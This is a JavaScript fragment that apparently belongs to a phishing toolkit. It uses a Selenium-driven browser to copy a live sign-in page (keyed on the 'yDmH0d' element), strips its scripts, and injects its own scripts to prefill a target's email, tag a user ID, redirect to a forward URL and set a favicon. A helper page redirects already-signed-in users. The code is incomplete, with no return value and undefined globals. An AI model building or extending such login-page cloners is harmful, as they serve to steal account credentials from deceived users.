export const getHtmlAlreadySignIn = (forwardURL) => `
		<html>
			<script>window.location.href="${forwardURL}"</script>
		</html>
	`;

export const buildHTMLByPageSource = async (pageSource) => {
  // remove script
  let htmlText = removeSpecificTag(pageSource, "script");
  htmlText = removeSpecificTag(htmlText, "iframe");
  // change style
  let styleList = getSpecificTagList(pageSource, "style");
  htmlText = removeSpecificTag(htmlText, "style");

  let divEl = await driver.findElement(By.id("yDmH0d"));
  if (!divEl) {
    return "";
  }
  let htmlYDmH0d = await divEl.getAttribute("innerHTML");
  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "script");
  htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "iframe");
  let htmlChange = htmlYDmH0d;
  for (let i = 0; i < styleList.length; i++) {
    htmlChange += styleList[i];
  }

  // replace
  htmlChange = addSetInputEmailValueScript(htmlChange, email);
  htmlText = htmlText.replace(htmlYDmH0d, htmlChange);
  // add script
  htmlText = setUserIdScript(htmlText, userId);

  htmlText = setForwardUrlScript(htmlText, forwardURL);
  htmlText = addFunctionsScript(htmlText);
  htmlText = addTimeoutScript(htmlText);
  htmlText = setFavicon(htmlText);
};
